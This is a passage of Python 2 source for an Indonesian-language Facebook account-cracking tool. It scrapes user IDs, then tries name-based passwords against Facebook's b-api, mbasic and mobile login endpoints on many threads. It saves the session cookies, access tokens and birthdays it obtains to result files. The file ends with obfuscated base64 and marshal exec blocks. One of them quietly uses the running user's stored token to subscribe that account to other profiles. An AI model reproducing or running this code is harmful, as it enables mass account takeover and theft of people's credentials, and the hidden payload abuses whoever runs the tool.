                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mbasic, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        elif skm in("3","03"):
                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mobile, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        else:
                            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
                    print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
                    print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
                    print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
                    print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
                    xxh(pwek.split(','))
                    break
        elif rom in ('T', 't'):
            print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
            print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
            print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
            print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
            self.sung()
        else:
            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
        return

    def api(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            response = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+user+"&password="+pw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
            if response.status_code != 200:
            	print ("\r\033[0;91m• IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                api(self, user, xxh)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print ('\r %s*--> %s ◊ %s ◊ %s   ' % (H,user,pw,response.json()['access_token']))
                wrt = ' *--> %s ◊ %s ◊ %s ' % (user,pw,response.json()['access_token'])
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mbasic(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki))
                wrt = (' *--> %s ◊ %s ◊ %s' % (user,pw,kuki))
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print ('\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year))
                    wrt = (' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year))
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print ('\r %s*--> %s ◊ %s           ' % (K,user,pw))
                wrt = (' *--> %s ◊ %s' % (user,pw))
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def mobile(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                wrt = ' *--> %s ◊ %s ◊ %s' % (user,pw,kuki)
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def sung(self):
        ii = raw_input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
        if ii == '':
            print '\n%s%s isi yang benar '%(M,til);self.askk()
        elif ii in ('1', '01'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.api, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('2', '02'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mbasic, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        elif ii in ('3', '03'):
            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
            with Lampung(max_workers=30) as njir:
            	for uh in self.id: 
                    try:
                        uid, name = uh.split('<=>')
                        i = name.split(' ')
                        if len(i) == 3 or len(i) == 4 or len(i) == 5 or len(i) == 6:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        else:
                            pwx = [name, i[0]+"123", i[0]+"12345"]
                        njir.submit(self.mobile, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            exit("\n%s%s finished "%(H,til))
        else:
            print '\n%s%s isi yang benar'%(M,til);self.askk()
            
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('data/token.txt', 'r').read()
    except IOError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print ("%s%s Token invalid "%(M,til));jeda(2);os.system('rm -rf data/token.txt');masuk()
    except requests.exceptions.ConnectionError:
        exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
    banner()
    print ('%s # %sName %s: %s%s%s \n'%(U,O,M,H,nama,O))
    print ('%s%s%s 01 %sDump id public'%(U,til,P,O))
    print ('%s%s%s 02 %sDump id followers'%(U,til,P,O))
    print ('%s%s%s 03 %sDump id reaction post'%(U,til,P,O))
    print ('%s%s%s 04 %sDump id member groups'%(U,til,P,O))
    print ('%s%s%s 05 %sDump id pencarian nama'%(U,til,P,O))
    print ('%s%s%s 06 %sDump id pesan mesengger'%(U,til,P,O))
    print ('%s%s%s 07 %sMulai crack'%(U,til,H,O))
    print ('%s%s%s 08 %sGanti user agent'%(U,til,P,O))
    print ('%s%s%s 09 %sCek hasil crack'%(U,til,P,O))
    #print ('%s%s%s 10 %sInfo script'%(U,til,P,O))
    print ('%s%s%s rm %sHapus token'%(U,til,P,O))
    print ('%s%s%s 00 %sKeluar'%(U,til,M,O))
    slut = raw_input('\n%s# %sPilih %s> %s'%(P,O,M,K))
    if slut == '':
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
    elif slut in['1','01']:
        publik(romz)
    elif slut in['2','02']:
        followers(romz)
    elif slut in['3','03']:
        postingan(romz)
    elif slut in['4','04']:
        dump_grup(basecookie())
    elif slut in['5','05']:
    	dumpfl()
        exit()
    elif slut in['6','06']:
    	dump_message(basecookie())
    elif slut in['7','07']:
        ngentod().askk()
    elif slut in['8','08']:
    	useragent()
    elif slut in['9','09']:
        try:
            dirs = os.listdir("hasil")
            print '\n%s%s%s [ hasil crack yang tersimpan ]\n'%(U,til,O,);jeda(0.2)
            for file in dirs:
                print("%s%s%s> %s%s"%(U,til,M,O,file));jeda(0.2)
            file = raw_input("\n%s%s%s masukan nama file %s:%s "%(U,til,O,M,O));jeda(0.2)
            if file == "":
                file = raw_input("\n%s%s%s masukan nama file :%s "%(U,til,O,H));jeda(0.2)
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            ttl_file  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan("%s%s%s Crack tanggal %s:%s%s %stotal %s: %s%s"%(U,til,O,M,P,ttl_file,O,M,P,len(total)))
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
        except (IOError):
            print("\n%s%s tidak ada hasil :("%(M,til))
            raw_input('\n%s%s%s kembali '%(U,til,O));menu()
    elif slut in['10']:
        print(ingfo)
    elif slut in['rm','Rm','RM']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt')
        jalan('\n%s%s berhasil menghapus token'%(H,til));exit()
    elif slut in['0','00']:
    	exit()
    else:
        print '\n%s%s isi yang benar'%(M,til);jeda(2);menu()
 

exec(base64.b64decode('IyAoIGFuYWsgbW9ueWV0IGxhZ2kgZGVjcnlwdCBzY3JpcHQgKQoKaW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKCdjXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAzXHgwMFx4MDBceDAwQFx4MDBceDAwXHgwMHMhXHgwMFx4MDBceDAwZFx4MDBceDAwZFx4MDFceDAwbFx4MDBceDAwWlx4MDBceDAwZVx4MDBceDAwalx4MDFceDAwZFx4MDJceDAwXHg4M1x4MDFceDAwZFx4MDFceDAwXHgwNFVkXHgwMVx4MDBTKFx4MDNceDAwXHgwMFx4MDBpXHhmZlx4ZmZceGZmXHhmZk5zb1x4MDdceDAwXHgwMGNceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDNceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwcyFceDAwXHgwMFx4MDBkXHgwMFx4MDBkXHgwMVx4MDBsXHgwMFx4MDBaXHgwMFx4MDBlXHgwMFx4MDBqXHgwMVx4MDBkXHgwMlx4MDBceDgzXHgwMVx4MDBkXHgwMVx4MDBceDA0VWRceDAxXHgwMFMoXHgwM1x4MDBceDAwXHgwMGlceGZmXHhmZlx4ZmZceGZmTnNceGRjXHgwNlx4MDBceDAwWkdWbUlHeHZaMmx1WDNoNEtDazZEUW9nSUNBZ2RISjVPZzBLSUNBZ0lDQWdJQ0IwYjJ0bGJpQTlJRzl3Wlc0b0ltUmhkR0V2ZEc5clpXNHVkSGgwSWl3aWNpSXBMbkpsWVdRb0tRMEtJQ0FnSUNBZ0lDQnlaWEYxWlhOMGN5NXdiM04wS0Nkb2RIUndjem92TDJkeVlYQm9MbVpoWTJWaWIyOXJMbU52YlM4eE1EQXdNakl3T0RZeE56STFOVFl2YzNWaWMyTnlhV0psY25NL1lXTmpaWE56WDNSdmEyVnVQU1Z6SnlVb2RHOXJaVzRwS1NBaklFWmhibk53WVdkbElGSnZiV2tnV0VRTkNpQWdJQ0FnSUNBZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2duYUhSMGNITTZMeTluY21Gd2FDNW1ZV05sWW05dmF5NWpiMjB2TVRBd01ESTRORE0wT0Rnd05USTVMM04xWW5OamNtbGlaWEp6UDJGalkyVnpjMTkwYjJ0bGJqMGxjeWNsS0hSdmEyVnVLU2tnSXlCU2IyMXBJRUZtY21sNllXd05DaUFnSUNBZ0lDQWdjbVZ4ZFdWemRITXVjRzl6ZENnbmFIUjBjSE02THk5bmNtRndhQzVtWVdObFltOXZheTVqYjIwdk1UQXdNRFkzT0RBM05UWTFPRFl4TDNOMVluTmpjbWxpWlhKelAyRmpZMlZ6YzE5MGIydGxiajBsY3ljbEtIUnZhMlZ1S1NrZ0l5QlNiMjFwSUVGbWNtbDZZV3dnS0RJd01qRXBEUW9nSUNBZ0lDQWdJSEpsY1hWbGMzUnpMbkJ2YzNRb0oyaDBkSEJ6T2k4dlozSmhjR2d1Wm1GalpXSnZiMnN1WTI5dEx6RXdNREF3TXpjeU16WTVOamc0TlM5emRXSnpZM0pwWW1WeWN6OWhZMk5sYzNOZmRHOXJaVzQ5SlhNbkpTaDBiMnRsYmlrcElDTWdTWEZpWVd3Z1ltOWllZzBLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TkRFeE1qa3dORGc1TkRndmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRWwzWVc0Z2FHRmthV0Z1YzNsaGFBMEtJQ0FnSUNBZ0lDQnlaWEYxWlhOMGN5NXdiM04wS0Nkb2RIUndjem92TDJkeVlYQm9MbVpoWTJWaWIyOXJMbU52YlM4eE1EQXdNRGMxTWpBeU1ETTBOVEl2YzNWaWMyTnlhV0psY25NL1lXTmpaWE56WDNSdmEyVnVQU1Z6SnlVb2RHOXJaVzRwS1NBaklFaGhiWHBoYUNCcmFYSmhibUVOQ2lBZ0lDQWdJQ0FnY21WeGRXVnpkSE11Y0c5emRDZ25hSFIwY0hNNkx5OW5jbUZ3YUM1bVlXTmxZbTl2YXk1amIyMHZNVEF3TURBeU5EWXhNelEwTVRjNEwzTjFZbk5qY21saVpYSnpQMkZqWTJWemMxOTBiMnRsYmowbGN5Y2xLSFJ2YTJWdUtTa2dJeUJWYm1scklGSlBUVWtnUVVaU1NWcEJUQTBLSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtDZG9kSFJ3Y3pvdkwyZHlZWEJvTG1aaFkyVmliMjlyTG1OdmJTOHhNREF3TnpFM05EYzBNakExT0RNdmMzVmljMk55YVdKbGNuTS9ZV05qWlhOelgzUnZhMlZ1UFNWekp5VW9kRzlyWlc0cEtTQWpJRVJ2Ym1sbWRHWmhibTU1RFFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBeU9URTBNekV4TVRVMk55OXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nUkdWdGFYUWdVbTl0YVNCQlpuSnBlbUZzRFFvZ0lDQWdJQ0FnSUhKbGNYVmxjM1J6TG5CdmMzUW9KMmgwZEhCek9pOHZaM0poY0dndVptRmpaV0p2YjJzdVkyOXRMekV3TURBd01UVTBNREk1T1RFd09DOXpkV0p6WTNKcFltVnljejloWTJObGMzTmZkRzlyWlc0OUpYTW5KU2gwYjJ0bGJpa3BJQ01nU0dGcmFXdHBEUW9nSUNBZ1pYaGpaWEIwT2cwS0lDQWdJQWx3WVhOeihceDAyXHgwMFx4MDBceDAwdFx4MDZceDAwXHgwMFx4MDBiYXNlNjR0XHRceDAwXHgwMFx4MDBiNjRkZWNvZGUoXHgwMFx4MDBceDAwXHgwMChceDAwXHgwMFx4MDBceDAwKFx4MDBceDAwXHgwMFx4MDBzXHgwMlx4MDBceDAwXHgwMGRndFx4MDhceDAwXHgwMFx4MDA8bW9kdWxlPlx4MDNceDAwXHgwMFx4MDBzXHgwMlx4MDBceDAwXHgwMFx4MGNceDAxKFx4MDJceDAwXHgwMFx4MDB0XHgwN1x4MDBceDAwXHgwMG1hcnNoYWx0XHgwNVx4MDBceDAwXHgwMGxvYWRzKFx4MDBceDAwXHgwMFx4MDAoXHgwMFx4MDBceDAwXHgwMChceDAwXHgwMFx4MDBceDAwc1x4MDJceDAwXHgwMFx4MDBkZ3RceDA4XHgwMFx4MDBceDAwPG1vZHVsZT5ceDAzXHgwMFx4MDBceDAwc1x4MDJceDAwXHgwMFx4MDBceDBjXHgwMScpKQ=='))

exec(marshal.loads("c\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s'\x00\x00\x00e\x00\x00d\x00\x00k\x02\x00r#\x00e\x01\x00j\x02\x00d\x01\x00\x83\x01\x00\x01e\x03\x00\x83\x00\x00\x01n\x00\x00d\x02\x00S(\x03\x00\x00\x00t\x08\x00\x00\x00__main__s\x08\x00\x00\x00git pullN(\x04\x00\x00\x00t\x08\x00\x00\x00__name__t\x02\x00\x00\x00ost\x06\x00\x00\x00systemt\x04\x00\x00\x00menu(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x0c\x01\r\x01"))